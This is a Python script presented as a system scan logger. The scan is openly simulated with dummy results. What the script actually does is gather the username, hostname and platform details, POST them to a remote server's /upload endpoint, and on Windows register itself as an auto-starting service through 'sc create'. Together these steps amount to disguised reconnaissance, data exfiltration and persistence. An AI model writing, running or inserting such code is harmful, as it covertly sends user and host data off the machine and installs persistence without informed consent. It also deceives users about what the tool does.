import os
import socket
import platform
import subprocess
import datetime
import sys
import json
import threading
from http.client import HTTPConnection

TARGET_DIR = './target'
REMOTE_SERVER = 'example.com'
REMOTE_PORT = 80
LOG_FILENAME = 'scan_log.json'
SERVICE_NAME = 'SystemScanLoggerService'
SCAN_ITERATIONS = 3

def gather_system_info():
    """Collect system information including username and hostname."""
    return {
        'username': os.getlogin(),
        'hostname': socket.gethostname(),
        'platform': platform.system(),
        'platform_version': platform.version(),
        'architecture': platform.architecture(),
        'cpu': platform.processor(),
        'python_version': platform.python_version(),
    }

def perform_system_scan():
    """Simulate a system scan and generate dummy logs."""
    return {
        'timestamp': datetime.datetime.now().isoformat(),
        'scan_results': 'System scan completed successfully.',
        'disk_usage': get_disk_usage(),
        'network_status': check_network_status(),
    }

def get_disk_usage():
    """Get disk usage statistics."""
    try:
        statvfs = os.statvfs('/')
        total = statvfs.f_frsize * statvfs.f_blocks
        free = statvfs.f_frsize * statvfs.f_bfree
        used = total - free
        return {
            'total_bytes': total,
            'used_bytes': used,
            'free_bytes': free,
        }
    except Exception as e:
        return {'error': f'Failed to retrieve disk usage: {e}'}

def check_network_status():
    """Check network connectivity."""
    try:
        connection = HTTPConnection(REMOTE_SERVER, REMOTE_PORT, timeout=5)
        connection.request('HEAD', '/')
        response = connection.getresponse()
        connection.close()
        return {'status': f'{response.status} {response.reason}'}
    except Exception as e:
        return {'status': 'offline', 'error': str(e)}

def save_logs_to_file(log_data):
    """Save logs to a JSON file in the target directory."""
    os.makedirs(TARGET_DIR, exist_ok=True)
    log_path = os.path.join(TARGET_DIR, LOG_FILENAME)
    try:
        with open(log_path, 'w', encoding='utf-8') as log_file:
            json.dump(log_data, log_file, ensure_ascii=False, indent=4)
    except IOError as e:
        print(f"Error saving logs: {e}", file=sys.stderr)

def send_logs_to_server(log_data):
    """Attempt to send logs to a remote server."""
    try:
        connection = HTTPConnection(REMOTE_SERVER, REMOTE_PORT, timeout=5)
        connection.request('POST', '/upload', body=json.dumps(log_data), headers={'Content-Type': 'application/json'})
        response = connection.getresponse()
        print(f"Server response: {response.status} {response.reason}")
        connection.close()
    except Exception as e:
        print(f"Failed to send logs to server: {e}", file=sys.stderr)

def register_system_service():
    """Register the tool as a system service (Windows only)."""
    if platform.system() != 'Windows':
        print("Service registration is only supported on Windows.", file=sys.stderr)
        return
    try:
        subprocess.run([
            'sc', 'create', SERVICE_NAME,
            'binPath=', f'"{sys.executable} {os.path.abspath(__file__)}"',
            'start=', 'auto'
        ], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"Service '{SERVICE_NAME}' registered successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to register service: {e}", file=sys.stderr)

def cleanup_old_logs():
    """Remove old log files exceeding a certain threshold."""
    try:
        for filename in os.listdir(TARGET_DIR):
            file_path = os.path.join(TARGET_DIR, filename)
            if os.path.isfile(file_path):
                file_age = datetime.datetime.now() - datetime.datetime.fromtimestamp(os.path.getmtime(file_path))
                if file_age.days > 30:  # Remove logs older than 30 days
                    os.remove(file_path)
    except Exception as e:
        print(f"Error during log cleanup: {e}", file=sys.stderr)

def main():
    system_info = gather_system_info()
    logs = {'system_info': system_info, 'scan_logs': []}

    # Perform system scans and collect logs
    for _ in range(SCAN_ITERATIONS):
        scan_log = perform_system_scan()
        logs['scan_logs'].append(scan_log)

    # Save logs locally
    save_logs_to_file(logs)

    # Cleanup old logs
    cleanup_old_logs()

    # Attempt to send logs to remote server
    send_logs_to_server(logs)

    # Optionally register as a system service
    register_system_service()

if __name__ == "__main__":
    main()

import os
